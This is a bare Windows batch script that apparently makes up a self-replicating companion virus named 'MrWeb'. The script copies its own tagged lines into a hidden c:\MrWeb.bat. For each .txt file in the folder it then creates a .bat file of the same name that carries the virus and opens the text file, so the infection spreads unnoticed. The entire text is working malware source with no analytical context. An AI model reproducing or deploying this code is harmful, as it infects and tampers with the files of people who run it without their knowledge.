@echo off%[MrWeb]%
if '%1=='In_ goto MrWebin
if exist c:\MrWeb.bat goto MrWebru
if not exist %0 goto MrWeben
find "MrWeb"<%0>c:\MrWeb.bat
attrib +h c:\MrWeb.bat
:MrWebru
for %%g in (*.txt) do call c:\MrWeb In_ %%g
goto MrWeben
:MrWebin
if exist %2.bat goto MrWeben
type c:\MrWeb.bat>>%2.bat
echo start %2>>%2.bat%[MrWeb]%
:MrWeben